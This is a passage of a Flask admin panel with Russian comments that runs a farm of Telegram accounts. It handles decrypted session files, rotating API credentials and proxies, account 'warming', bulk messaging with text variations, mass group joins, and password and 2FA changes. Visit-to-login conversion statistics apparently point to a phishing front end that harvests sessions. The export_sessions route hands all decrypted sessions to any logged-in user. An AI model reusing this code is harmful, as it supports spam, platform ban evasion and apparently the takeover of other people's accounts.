    stmt = select(AdminLog).order_by(desc(AdminLog.timestamp))
    if user_filter:
        stmt = stmt.filter(AdminLog.username.contains(user_filter))
    if action_filter:
        stmt = stmt.filter(AdminLog.action == action_filter)
    if date_from:
        try:
            stmt = stmt.filter(AdminLog.timestamp >= datetime.datetime.strptime(date_from, '%Y-%m-%d'))
        except ValueError:
            pass
    if date_to:
        try:
            dt_to = datetime.datetime.strptime(date_to, '%Y-%m-%d') + datetime.timedelta(days=1)
            stmt = stmt.filter(AdminLog.timestamp < dt_to)
        except ValueError:
            pass

    logs = db.session.execute(stmt).scalars().all()
    file_data = ExcelExporter.export_logs(logs)
    log_action("export_logs", f"Экспорт логов: {len(logs)} записей")
    return send_file(
        file_data,
        mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        as_attachment=True,
        download_name=f'logs_{datetime.date.today()}.xlsx'
    )


# ==========================================
# 10. МОНИТОРИНГ СЕРВЕРА
# ==========================================
@admin_bp.route('/monitoring')
@login_required
def monitoring():
    """Страница мониторинга ресурсов сервера (CPU/RAM/Disk + версии)."""
    import sys
    import flask
    import sqlalchemy
    import subprocess

    try:
        import telethon
        telethon_version = telethon.__version__
    except Exception:
        telethon_version = 'n/a'

    try:
        git_commit = subprocess.check_output(
            ['git', 'log', '-1', '--format=%h %s'],
            cwd=Config.BASE_DIR,
            stderr=subprocess.DEVNULL,
            timeout=5
        ).decode().strip()
    except Exception:
        git_commit = 'n/a'

    version_info = {
        'python': sys.version.split()[0],
        'flask': flask.__version__,
        'sqlalchemy': sqlalchemy.__version__,
        'telethon': telethon_version,
        'git_commit': git_commit,
    }
    return render_template('admin/monitoring.html', version_info=version_info)


@admin_bp.route('/monitoring/stats')
@login_required
def monitoring_stats():
    """AJAX endpoint: текущие метрики CPU/RAM/Disk в JSON."""
    try:
        import psutil
        cpu = psutil.cpu_percent(interval=None)  # Non-blocking; previous call primed the counter
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        return jsonify({
            'cpu': round(cpu, 1),
            'ram': round(mem.percent, 1),
            'ram_used_mb': round(mem.used / 1024 / 1024, 0),
            'ram_total_mb': round(mem.total / 1024 / 1024, 0),
            'disk': round(disk.percent, 1),
            'disk_used_gb': round(disk.used / 1024 / 1024 / 1024, 2),
            'disk_total_gb': round(disk.total / 1024 / 1024 / 1024, 2),
            'warnings': {
                'cpu': cpu > 80,
                'ram': mem.percent > 90,
                'disk': disk.percent > 90,
            },
        })
    except ImportError:
        return jsonify({'error': 'psutil not installed'}), 500


@admin_bp.route('/monitoring/tasks')
@login_required
def monitoring_tasks():
    """AJAX endpoint: последние фоновые задачи (Task model)."""
    try:
        recent_tasks = db.session.execute(
            select(Task).order_by(desc(Task.created_at)).limit(20)
        ).scalars().all()
        return jsonify({
            'success': True,
            'tasks': [
                {
                    'id': t.id,
                    'task_id': t.task_id,
                    'name': t.name,
                    'status': t.status,
                    'error': t.error,
                    'created_at': t.created_at.isoformat() if t.created_at else None,
                    'updated_at': t.updated_at.isoformat() if t.updated_at else None,
                }
                for t in recent_tasks
            ]
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ==========================================
# 11. УПРАВЛЕНИЕ API-УЧЁТНЫМИ ДАННЫМИ
# ==========================================
@admin_bp.route('/settings/api_credentials')
@login_required
@admin_required
def api_credentials():
    """Список пар API ID/Hash для ротации."""
    creds = db.session.execute(select(ApiCredential).order_by(ApiCredential.id)).scalars().all()
    return render_template('admin/api_credentials.html', creds=creds)


@admin_bp.route('/settings/api_credentials/add', methods=['POST'])
@login_required
@admin_required
def api_credentials_add():
    """Добавление новой пары API ID/Hash."""
    api_id = request.form.get('api_id', '').strip()
    api_hash = request.form.get('api_hash', '').strip()
    label = request.form.get('label', '').strip()

    if not api_id or not api_hash:
        flash('API ID и API Hash обязательны', 'danger')
        return redirect(url_for('admin.api_credentials'))

    try:
        cred = ApiCredential(api_id=api_id, api_hash=api_hash, label=label or None)
        db.session.add(cred)
        db.session.commit()
        log_action("api_credential_add", f"Добавлена пара API ID: {api_id} ({label})")
        flash('Учётные данные API добавлены', 'success')
    except Exception as e:
        db.session.rollback()
        flash(f'Ошибка: {e}', 'danger')
    return redirect(url_for('admin.api_credentials'))


@admin_bp.route('/settings/api_credentials/<int:cred_id>/delete', methods=['POST'])
@login_required
@admin_required
def api_credentials_delete(cred_id):
    """Удаление пары API ID/Hash."""
    cred = db.session.get(ApiCredential, cred_id)
    if not cred:
        return jsonify({'success': False, 'error': 'Не найдено'}), 404
    try:
        db.session.delete(cred)
        db.session.commit()
        log_action("api_credential_delete", f"Удалена пара API ID: {cred.api_id}")
        return jsonify({'success': True})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/settings/api_credentials/<int:cred_id>/toggle', methods=['POST'])
@login_required
@admin_required
def api_credentials_toggle(cred_id):
    """Включение/отключение пары учётных данных."""
    cred = db.session.get(ApiCredential, cred_id)
    if not cred:
        return jsonify({'success': False, 'error': 'Не найдено'}), 404
    cred.enabled = not cred.enabled
    db.session.commit()
    log_action("api_credential_toggle", f"API ID {cred.api_id}: {'enabled' if cred.enabled else 'disabled'}")
    return jsonify({'success': True, 'enabled': cred.enabled})


# ==========================================
# 12. ИСТОРИЯ ДЕЙСТВИЙ ПО АККАУНТУ
# ==========================================
@admin_bp.route('/accounts/<account_id>/history')
@login_required
def account_history(account_id):
    """AJAX: история действий конкретного аккаунта (JSON)."""
    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'error': 'Аккаунт не найден'}), 404
    logs = db.session.execute(
        select(AccountLog)
        .filter(AccountLog.account_id == account_id)
        .order_by(desc(AccountLog.created_at))
        .limit(100)
    ).scalars().all()
    return jsonify([{
        'id': e.id,
        'action': e.action,
        'result': e.result,
        'details': e.details or '',
        'initiator': e.initiator or 'system',
        'initiator_ip': e.initiator_ip or '—',
        'created_at': e.created_at.strftime('%Y-%m-%d %H:%M:%S') if e.created_at else '',
    } for e in logs])


@admin_bp.route('/accounts/<account_id>/check_session', methods=['POST'])
@login_required
@admin_required
def account_check_session(account_id):
    """Запустить проверку сессии одного аккаунта."""
    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'success': False, 'error': 'Аккаунт не найден'}), 404
    try:
        from tasks.session_checker import check_single_session_task
        task = check_single_session_task.delay(
            account_id,
            initiator=current_user.username,
            initiator_ip=request.remote_addr
        )
        log_action("account_check_session", f"Запущена проверка сессии: {account.phone}")
        return jsonify({'success': True, 'task_id': task.id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/accounts/check_all_sessions', methods=['POST'])
@login_required
@admin_required
def accounts_check_all_sessions():
    """Запустить массовую проверку всех сессий."""
    try:
        from tasks.session_checker import check_all_sessions
        task = check_all_sessions.delay()
        log_action("accounts_check_all_sessions", "Запущена массовая проверка сессий")
        return jsonify({'success': True, 'task_id': task.id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/accounts/<account_id>/detail')
@login_required
def account_detail(account_id):
    """AJAX: детальная информация об аккаунте для модального окна (JSON)."""
    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'error': 'Аккаунт не найден'}), 404

    # Подсчёт количества записей в истории
    log_count = db.session.execute(
        select(func.count(AccountLog.id)).filter(AccountLog.account_id == account_id)
    ).scalar() or 0

    # Определяем время flood wait (если есть)
    flood_remaining = None
    if account.flood_wait_until:
        from datetime import timezone as tz
        import datetime as dt
        now = dt.datetime.now(tz.utc)
        if account.flood_wait_until.tzinfo is None:
            flood_end = account.flood_wait_until.replace(tzinfo=tz.utc)
        else:
            flood_end = account.flood_wait_until
        remaining = (flood_end - now).total_seconds()
        flood_remaining = max(0, int(remaining))

    # Определяем время неактивности
    inactive_days = None
    if account.last_active:
        import datetime as dt
        from datetime import timezone as tz
        now = dt.datetime.now(tz.utc)
        last = account.last_active
        if last.tzinfo is None:
            last = last.replace(tzinfo=tz.utc)
        inactive_days = (now - last).days

    return jsonify({
        'id': account.id,
        'phone': account.phone,
        'username': account.username or '',
        'first_name': account.first_name or '',
        'last_name': account.last_name or '',
        'premium': account.premium or False,
        'status': account.status or 'unknown',
        'status_detail': account.status_detail or '',
        'tg_id': account.tg_id or '',
        'dc_id': account.dc_id,
        'session_file': account.session_file or '',
        'has_session': bool(account.session_data),
        'proxy': f"{account.proxy.host}:{account.proxy.port}" if account.proxy else '',
        'proxy_type': account.proxy.type if account.proxy else '',
        'created_at': account.created_at.strftime('%Y-%m-%d %H:%M:%S') if account.created_at else '',
        'last_used': account.last_used.strftime('%Y-%m-%d %H:%M:%S') if account.last_used else '',
        'last_checked': account.last_checked.strftime('%Y-%m-%d %H:%M:%S') if account.last_checked else '',
        'last_active': account.last_active.strftime('%Y-%m-%d %H:%M:%S') if account.last_active else '',
        'flood_wait_until': account.flood_wait_until.strftime('%Y-%m-%d %H:%M:%S') if account.flood_wait_until else '',
        'flood_remaining': flood_remaining,
        'inactive_days': inactive_days,
        'log_count': log_count,
        'notes': account.notes or '',
        'owner': account.owner.username if account.owner else '',
    })


@admin_bp.route('/accounts/<account_id>/download_session')
@login_required
@admin_required
def account_download_session(account_id):
    """Скачивание .session файла аккаунта."""
    account = db.session.get(Account, account_id)
    if not account:
        flash('Аккаунт не найден', 'danger')
        return redirect(url_for('admin.accounts'))

    if account.session_file:
        session_path = Path(Config.SESSIONS_DIR) / account.session_file
        resolved = session_path.resolve()
        sessions_dir = Path(Config.SESSIONS_DIR).resolve()
        if resolved.is_relative_to(sessions_dir) and resolved.exists():
            log_action("account_download_session", f"Скачан .session: {account.phone}")
            return send_file(str(resolved), as_attachment=True,
                             download_name=account.session_file)

    # Если файла нет, но есть данные сессии — генерируем на лету
    if account.session_data:
        from utils.encryption import decrypt_session_data
        try:
            session_str = decrypt_session_data(account.session_data)
            safe_phone = account.phone.lstrip('+').replace(' ', '').replace('-', '')
            filename = f"{safe_phone}.session"

            session_bytes = session_str.encode('utf-8')
            return send_file(
                io.BytesIO(session_bytes),
                as_attachment=True,
                download_name=filename,
                mimetype='application/octet-stream'
            )
        except Exception as e:
            log.error(f"Session decrypt error for {account_id}: {e}")
            flash('Ошибка дешифрования сессии', 'danger')
            return redirect(url_for('admin.accounts'))

    flash('Сессия не найдена', 'danger')
    return redirect(url_for('admin.accounts'))


# ==========================================
# 13. АВТОЗАГРУЗКА ПРОКСИ
# ==========================================
@admin_bp.route('/proxies/auto_load', methods=['POST'])
@login_required
@admin_required
def proxies_auto_load():
    """Запускает фоновую задачу автоматической загрузки прокси из публичных источников."""
    try:
        proxy_type = request.form.get('proxy_type', '').strip() or None
        country = request.form.get('country', '').strip() or None
        from tasks.proxy_autoloader import auto_load_proxies
        task = auto_load_proxies.delay(proxy_type_filter=proxy_type, country_filter=country)
        details = []
        if proxy_type:
            details.append(f"тип={proxy_type}")
        if country:
            details.append(f"страна={country}")
        filter_str = f" ({', '.join(details)})" if details else ""
        log_action("proxies_auto_load", f"Запущена автозагрузка прокси{filter_str}")
        flash(f'Автозагрузка прокси запущена в фоне{filter_str}', 'success')
    except Exception as e:
        flash(f'Ошибка запуска задачи: {e}', 'danger')
    return redirect(url_for('admin.proxies'))


# --- STATS API ---
@admin_bp.route('/api/stats')
@login_required
def api_stats():
    """Returns weekly or monthly stats data for Chart.js graphs"""
    period = request.args.get('period', 'week')
    days = 7 if period == 'week' else 30
    from datetime import date, timedelta
    today = date.today()
    dates = [(today - timedelta(days=i)) for i in range(days-1, -1, -1)]
    stats = db.session.query(Stat).filter(Stat.date.in_(dates)).all()
    stats_map = {s.date: s for s in stats}
    result = {
        'labels': [d.strftime('%d.%m') for d in dates],
        'visits': [getattr(stats_map.get(d), 'visits', 0) or 0 for d in dates],
        'logins': [getattr(stats_map.get(d), 'successful_logins', 0) or 0 for d in dates],
        'conversion': [round(getattr(stats_map.get(d), 'conversion_to_login', 0) or 0, 1) for d in dates],
    }
    return jsonify(result)


# --- NOTIFICATIONS ---
@admin_bp.route('/api/notifications')
@login_required
def api_notifications():
    notifs = db.session.query(Notification).filter(
        or_(Notification.user_id == None, Notification.user_id == current_user.id)
    ).order_by(Notification.created_at.desc()).limit(20).all()
    unread = db.session.query(func.count(Notification.id)).filter(
        Notification.is_read == False,
        or_(Notification.user_id == None, Notification.user_id == current_user.id)
    ).scalar()
    return jsonify({
        'success': True,
        'notifications': [{'id': n.id, 'title': n.title, 'message': n.message,
                           'type': n.type, 'category': n.category, 'is_read': n.is_read,
                           'created_at': n.created_at.isoformat() if n.created_at else None,
                           'related_url': n.related_url} for n in notifs],
        'unread': unread
    })

@admin_bp.route('/api/notifications/mark_read', methods=['POST'])
@login_required
def api_notifications_mark_read():
    db.session.query(Notification).filter(
        or_(Notification.user_id == None, Notification.user_id == current_user.id),
        Notification.is_read == False
    ).update({'is_read': True})
    db.session.commit()
    return jsonify({'success': True})

@admin_bp.route('/api/notifications/stream')
@login_required
def api_notifications_stream():
    """Polling endpoint for new notifications since last_id. Returns JSON and closes immediately."""
    last_id = request.args.get('last_id', 0, type=int)
    notifs = db.session.query(Notification).filter(
        Notification.id > last_id,
        or_(Notification.user_id == None, Notification.user_id == current_user.id)
    ).order_by(Notification.id).limit(10).all()
    return jsonify({'success': True, 'notifications': [
        {'id': n.id, 'title': n.title, 'type': n.type} for n in notifs
    ]})


# --- TASKS ---
@admin_bp.route('/tasks')
@login_required
def tasks():
    status_filter = request.args.get('status', '')
    name_filter = request.args.get('name', '')
    q = db.session.query(Task)
    if status_filter:
        q = q.filter(Task.status == status_filter)
    if name_filter:
        q = q.filter(Task.name.ilike(f'%{name_filter}%'))
    tasks_list = q.order_by(Task.created_at.desc()).limit(200).all()
    return render_template('admin/tasks.html', tasks=tasks_list,
                           status_filter=status_filter, name_filter=name_filter)

@admin_bp.route('/tasks/<task_id>/cancel', methods=['POST'])
@login_required
@admin_required
def task_cancel(task_id):
    try:
        from tasks.celery_app import celery as celery_app
        celery_app.control.revoke(task_id, terminate=True)
        task = db.session.query(Task).filter(Task.task_id == task_id).first()
        if task:
            task.status = 'REVOKED'
            db.session.commit()
        log_action('task_cancel', f'task_id={task_id}')
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# --- SECURITY ---
@admin_bp.route('/security')
@login_required
@admin_required
def security():
    failed_users = db.session.query(User).filter(User.login_attempts > 0).all()
    user_sessions = db.session.query(UserSession).order_by(UserSession.last_active.desc()).limit(50).all()
    suspicious = db.session.query(AdminLog).filter(
        AdminLog.action == 'login_failed'
    ).order_by(AdminLog.timestamp.desc()).limit(50).all()
    return render_template('admin/security.html',
                           failed_users=failed_users,
                           user_sessions=user_sessions,
                           suspicious=suspicious)

@admin_bp.route('/security/session/<int:session_id>/revoke', methods=['POST'])
@login_required
@admin_required
def revoke_session(session_id):
    try:
        sess = db.session.query(UserSession).filter(UserSession.id == session_id).first()
        if sess:
            db.session.delete(sess)
            db.session.commit()
        log_action('revoke_session', f'session_id={session_id}')
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# --- ACCOUNT DETAIL ---
@admin_bp.route('/accounts/<account_id>')
@login_required
def account_detail_page(account_id):
    account = db.session.query(Account).filter(Account.id == account_id).first()
    if not account:
        flash('Аккаунт не найден', 'error')
        return redirect(url_for('admin.accounts'))
    logs_q = db.session.query(AccountLog).filter(AccountLog.account_id == account_id)\
        .order_by(AccountLog.created_at.desc())
    page = request.args.get('page', 1, type=int)
    logs = logs_q.paginate(page=page, per_page=20, error_out=False)
    proxies = db.session.query(Proxy).filter(Proxy.enabled == True).all()
    scenarios = db.session.query(WarmingScenario).all()
    return render_template('admin/account_detail.html', account=account, logs=logs,
                           proxies=proxies, scenarios=scenarios, warming_scenarios=scenarios)


# --- ACCOUNT ACTIONS ---
@admin_bp.route('/accounts/<account_id>/send_message', methods=['POST'])
@login_required
@admin_required
def account_send_message(account_id):
    data = request.get_json()
    recipient = data.get('recipient')
    text = data.get('text')
    if not recipient or not text:
        return jsonify({'success': False, 'error': 'recipient and text required'})
    try:
        from tasks.mass_actions import send_bulk_messages_task
        task = send_bulk_messages_task.delay(account_id, [recipient], text, [])
        log_action('send_message', f'account={account_id} recipient={recipient}')
        return jsonify({'success': True, 'task_id': task.id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/accounts/bulk_send_message', methods=['POST'])
@login_required
@admin_required
def bulk_send_message():
    data = request.get_json()
    account_ids = data.get('account_ids', [])
    recipients = data.get('recipients', [])
    text = data.get('text', '')
    variations = data.get('variations', [])
    if not account_ids or not recipients or not text:
        return jsonify({'success': False, 'error': 'account_ids, recipients and text required'})
    try:
        from tasks.mass_actions import send_bulk_messages_task
        task_ids = []
        for aid in account_ids:
            t = send_bulk_messages_task.delay(aid, recipients, text, variations)
            task_ids.append(t.id)
        log_action('bulk_send_message', f'{len(account_ids)} accounts, {len(recipients)} recipients')
        return jsonify({'success': True, 'task_ids': task_ids})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/accounts/<account_id>/join_group', methods=['POST'])
@login_required
@admin_required
def account_join_group(account_id):
    data = request.get_json()
    invite_link = data.get('invite_link')
    if not invite_link:
        return jsonify({'success': False, 'error': 'invite_link required'})
    try:
        from tasks.mass_actions import join_group_task
        task = join_group_task.delay(account_id, invite_link)
        log_action('join_group', f'account={account_id} link={invite_link}')
        return jsonify({'success': True, 'task_id': task.id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/accounts/bulk_join_group', methods=['POST'])
@login_required
@admin_required
def bulk_join_group():
    data = request.get_json()
    account_ids = data.get('account_ids', [])
    invite_link = data.get('invite_link', '')
    if not account_ids or not invite_link:
        return jsonify({'success': False, 'error': 'account_ids and invite_link required'})
    try:
        from tasks.mass_actions import join_group_task
        task_ids = [join_group_task.delay(aid, invite_link).id for aid in account_ids]
        log_action('bulk_join_group', f'{len(account_ids)} accounts, link={invite_link}')
        return jsonify({'success': True, 'task_ids': task_ids})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/accounts/<account_id>/change_password', methods=['POST'])
@login_required
@admin_required
def account_change_password(account_id):
    data = request.get_json()
    new_password = data.get('password')
    if not new_password:
        return jsonify({'success': False, 'error': 'password required'})
    try:
        from tasks.mass_actions import change_password_task
        task = change_password_task.delay(account_id, new_password)
        log_action('change_tg_password', f'account={account_id}')
        return jsonify({'success': True, 'task_id': task.id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/accounts/<account_id>/enable_2fa', methods=['POST'])
@login_required
@admin_required
def account_enable_2fa(account_id):
    data = request.get_json()
    password = data.get('password')
    hint = data.get('hint', '')
    if not password:
        return jsonify({'success': False, 'error': 'password required'})
    try:
        from tasks.mass_actions import enable_2fa_task
        task = enable_2fa_task.delay(account_id, password, hint)
        log_action('enable_2fa', f'account={account_id}')
        return jsonify({'success': True, 'task_id': task.id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/accounts/<account_id>/assign_proxy', methods=['POST'])
@login_required
@admin_required
def account_assign_proxy(account_id):
    data = request.get_json()
    proxy_id = data.get('proxy_id')
    account = db.session.query(Account).filter(Account.id == account_id).first()
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    account.proxy_id = proxy_id
    db.session.commit()
    log_action('assign_proxy', f'account={account_id} proxy={proxy_id}')
    return jsonify({'success': True})

@admin_bp.route('/accounts/<account_id>/remove_proxy', methods=['POST'])
@login_required
@admin_required
def account_remove_proxy(account_id):
    account = db.session.query(Account).filter(Account.id == account_id).first()
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    account.proxy_id = None
    db.session.commit()
    log_action('remove_proxy', f'account={account_id}')
    return jsonify({'success': True})

@admin_bp.route('/accounts/bulk_assign_proxy', methods=['POST'])
@login_required
@admin_required
def bulk_assign_proxy():
    data = request.get_json()
    account_ids = data.get('account_ids', [])
    proxy_id = data.get('proxy_id')
    mode = data.get('mode', 'specific')
    if not account_ids:
        return jsonify({'success': False, 'error': 'account_ids required'})
    try:
        if mode == 'round_robin':
            proxies = db.session.query(Proxy).filter(Proxy.enabled == True, Proxy.status == 'working').all()
            if not proxies:
                return jsonify({'success': False, 'error': 'No working proxies available'})
            for i, aid in enumerate(account_ids):
                acc = db.session.query(Account).filter(Account.id == aid).first()
                if acc:
                    acc.proxy_id = proxies[i % len(proxies)].id
        else:
            db.session.query(Account).filter(Account.id.in_(account_ids)).update({'proxy_id': proxy_id}, synchronize_session=False)
        db.session.commit()
        log_action('bulk_assign_proxy', f'{len(account_ids)} accounts, proxy={proxy_id}, mode={mode}')
        return jsonify({'success': True})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)})


# --- TAGS API ---
@admin_bp.route('/api/tags', methods=['GET'])
@login_required
def api_tags_list():
    tags = db.session.query(Tag).all()
    return jsonify({'success': True, 'tags': [{'id': t.id, 'name': t.name, 'color': t.color} for t in tags]})

@admin_bp.route('/api/tags', methods=['POST'])
@login_required
@admin_required
def api_tags_create():
    data = request.get_json()
    name = data.get('name', '').strip()
    color = data.get('color', '#6B7280')
    if not name:
        return jsonify({'success': False, 'error': 'name required'})
    tag = Tag(name=name, color=color)
    db.session.add(tag)
    db.session.commit()
    log_action('create_tag', f'name={name}')
    return jsonify({'success': True, 'tag': {'id': tag.id, 'name': tag.name, 'color': tag.color}})

@admin_bp.route('/api/tags/<int:tag_id>', methods=['DELETE'])
@login_required
@admin_required
def api_tags_delete(tag_id):
    tag = db.session.query(Tag).filter(Tag.id == tag_id).first()
    if not tag:
        return jsonify({'success': False, 'error': 'Tag not found'})
    db.session.delete(tag)
    db.session.commit()
    log_action('delete_tag', f'tag_id={tag_id}')
    return jsonify({'success': True})

@admin_bp.route('/accounts/<account_id>/tags', methods=['POST'])
@login_required
@admin_required
def account_assign_tags(account_id):
    data = request.get_json()
    tag_ids = data.get('tag_ids', [])
    account = db.session.query(Account).filter(Account.id == account_id).first()
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    tags = db.session.query(Tag).filter(Tag.id.in_(tag_ids)).all()
    account.tags = tags
    db.session.commit()
    log_action('assign_tags', f'account={account_id} tags={tag_ids}')
    return jsonify({'success': True})

@admin_bp.route('/accounts/bulk_tags', methods=['POST'])
@login_required
@admin_required
def bulk_assign_tags():
    data = request.get_json()
    account_ids = data.get('account_ids', [])
    tag_ids = data.get('tag_ids', [])
    if not account_ids or not tag_ids:
        return jsonify({'success': False, 'error': 'account_ids and tag_ids required'})
    tags = db.session.query(Tag).filter(Tag.id.in_(tag_ids)).all()
    accounts = db.session.query(Account).filter(Account.id.in_(account_ids)).all()
    for acc in accounts:
        for tag in tags:
            if tag not in acc.tags:
                acc.tags.append(tag)
    db.session.commit()
    log_action('bulk_assign_tags', f'{len(account_ids)} accounts, tags={tag_ids}')
    return jsonify({'success': True})


# --- WARMING ---
@admin_bp.route('/warming')
@login_required
def warming():
    scenarios = db.session.query(WarmingScenario).all()
    sessions_q = db.session.query(WarmingSession).order_by(WarmingSession.started_at.desc()).limit(100).all()
    return render_template('admin/warming.html', scenarios=scenarios, warming_sessions=sessions_q)

@admin_bp.route('/warming/scenarios', methods=['POST'])
@login_required
@admin_required
def warming_create_scenario():
    data = request.get_json()
    scenario = WarmingScenario(
        name=data.get('name', 'New Scenario'),
        actions=data.get('actions', []),
        interval_minutes=data.get('interval_minutes', 30),
        duration_hours=data.get('duration_hours', 24),
        is_active=True
    )
    db.session.add(scenario)
    db.session.commit()
    log_action('create_warming_scenario', f'name={scenario.name}')
    return jsonify({'success': True, 'id': scenario.id})

@admin_bp.route('/warming/scenarios/<int:scenario_id>', methods=['DELETE'])
@login_required
@admin_required
def warming_delete_scenario(scenario_id):
    scenario = db.session.query(WarmingScenario).filter(WarmingScenario.id == scenario_id).first()
    if not scenario:
        return jsonify({'success': False, 'error': 'Not found'})
    db.session.delete(scenario)
    db.session.commit()
    log_action('delete_warming_scenario', f'id={scenario_id}')
    return jsonify({'success': True})

@admin_bp.route('/accounts/<account_id>/start_warming', methods=['POST'])
@login_required
@admin_required
def account_start_warming(account_id):
    data = request.get_json()
    scenario_id = data.get('scenario_id')
    scenario = db.session.query(WarmingScenario).filter(WarmingScenario.id == scenario_id).first()
    if not scenario:
        return jsonify({'success': False, 'error': 'Scenario not found'})
    account = db.session.query(Account).filter(Account.id == account_id).first()
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    warming_sess = WarmingSession(
        account_id=account_id, scenario_id=scenario_id, status='pending'
    )
    db.session.add(warming_sess)
    account.warming_status = 'warming'
    db.session.commit()
    log_action('start_warming', f'account={account_id} scenario={scenario_id}')
    return jsonify({'success': True})


# --- ACCOUNT HEALTH ---
@admin_bp.route('/accounts/health')
@login_required
def accounts_health():
    return render_template('admin/accounts_health.html')

@admin_bp.route('/api/accounts/health_stats')
@login_required
def api_accounts_health_stats():
    from datetime import datetime, timedelta
    now = datetime.utcnow()
    counts = {}
    for status in ['active', 'banned', 'flood_wait', 'expired', '2fa', 'inactive']:
        counts[status] = db.session.query(func.count(Account.id)).filter(Account.status == status).scalar() or 0

    week_ago = now - timedelta(days=7)
    at_risk = db.session.query(Account).filter(
        or_(
            and_(Account.status == 'active', Account.last_active < week_ago),
            Account.status == 'flood_wait',
            Account.session_data == None
        )
    ).limit(20).all()

    total = sum(counts.values())
    banned_pct = (counts['banned'] / total * 100) if total > 0 else 0

    if banned_pct > 30:
        try:
            create_notification(
                f'Высокий процент забаненных аккаунтов: {banned_pct:.1f}%',
                f'{counts["banned"]} из {total} аккаунтов забанены',
                type='warning', category='account_ban'
            )
        except Exception:
            pass

    return jsonify({
        'success': True,
        'counts': counts,
        'total': total,
        'at_risk': [{'id': a.id, 'phone': a.phone, 'status': a.status,
                     'last_active': a.last_active.isoformat() if a.last_active else None} for a in at_risk]
    })


# --- EXPORT ROUTES ---
@admin_bp.route('/export/accounts/csv')
@login_required
def export_accounts_csv():
    # Non-superadmin users export only their own accounts
    if current_user.role != 'superadmin':
        accounts = db.session.query(Account).filter(Account.owner_id == current_user.id).all()
    else:
        accounts = db.session.query(Account).all()
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['ID', 'Phone', 'Username', 'First Name', 'Last Name', 'Status', 'Premium', 'Created At'])
    for a in accounts:
        writer.writerow([a.id, a.phone, a.username or '', a.first_name or '', a.last_name or '',
                         a.status, a.premium, a.created_at])
    output.seek(0)
    return send_file(io.BytesIO(output.getvalue().encode('utf-8')),
                     mimetype='text/csv', as_attachment=True,
                     download_name='accounts.csv')

@admin_bp.route('/export/accounts/txt')
@login_required
def export_accounts_txt():
    # Non-superadmin users export only their own accounts
    if current_user.role != 'superadmin':
        accounts = db.session.query(Account).filter(Account.owner_id == current_user.id).all()
    else:
        accounts = db.session.query(Account).all()
    phones = '\n'.join(a.phone for a in accounts)
    return send_file(io.BytesIO(phones.encode('utf-8')),
                     mimetype='text/plain', as_attachment=True,
                     download_name='phones.txt')

@admin_bp.route('/export/logs/csv')
@login_required
def export_logs_csv():
    logs = db.session.query(AdminLog).order_by(AdminLog.timestamp.desc()).all()
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['ID', 'Username', 'Action', 'Details', 'IP', 'Timestamp'])
    for l in logs:
        writer.writerow([l.id, l.username, l.action, l.details or '', l.ip, l.timestamp])
    output.seek(0)
    return send_file(io.BytesIO(output.getvalue().encode('utf-8')),
                     mimetype='text/csv', as_attachment=True,
                     download_name='logs.csv')

@admin_bp.route('/export/logs/json')
@login_required
def export_logs_json():
    logs = db.session.query(AdminLog).order_by(AdminLog.timestamp.desc()).all()
    data = [{'id': l.id, 'username': l.username, 'action': l.action,
             'details': l.details, 'ip': l.ip,
             'timestamp': l.timestamp.isoformat() if l.timestamp else None} for l in logs]
    return send_file(io.BytesIO(json.dumps(data, ensure_ascii=False).encode('utf-8')),
                     mimetype='application/json', as_attachment=True,
                     download_name='logs.json')

@admin_bp.route('/export/campaigns')
@login_required
def export_campaigns():
    campaigns = db.session.query(Campaign).all()
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['ID', 'Name', 'Status', 'Total', 'Processed', 'Successful', 'Failed', 'Created At'])
    for c in campaigns:
        writer.writerow([c.id, c.name, c.status, c.total_targets, c.processed, c.successful, c.failed, c.created_at])
    output.seek(0)
    return send_file(io.BytesIO(output.getvalue().encode('utf-8')),
                     mimetype='text/csv', as_attachment=True,
                     download_name='campaigns.csv')

@admin_bp.route('/export/sessions')
@login_required
def export_sessions():
    accounts = db.session.query(Account).filter(Account.session_data != None).all()
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for a in accounts:
            if a.session_data:
                try:
                    from utils.encryption import decrypt_session_data
                    session_str = decrypt_session_data(a.session_data)
                    zf.writestr(f'{a.phone}.session', session_str)
                except Exception:
                    pass
    zip_buffer.seek(0)
    return send_file(zip_buffer, mimetype='application/zip', as_attachment=True,
                     download_name='sessions.zip')


# --- BULK OPERATIONS ---
@admin_bp.route('/accounts/bulk_deactivate', methods=['POST'])
@login_required
@admin_required
def bulk_deactivate():
    data = request.get_json()
    ids = data.get('ids', [])
    if not ids:
        return jsonify({'success': False, 'error': 'ids required'})
    db.session.query(Account).filter(Account.id.in_(ids)).update({'status': 'inactive'}, synchronize_session=False)
    db.session.commit()
    log_action('bulk_deactivate', f'{len(ids)} accounts')
    return jsonify({'success': True})

@admin_bp.route('/accounts/bulk_check_sessions', methods=['POST'])
@login_required
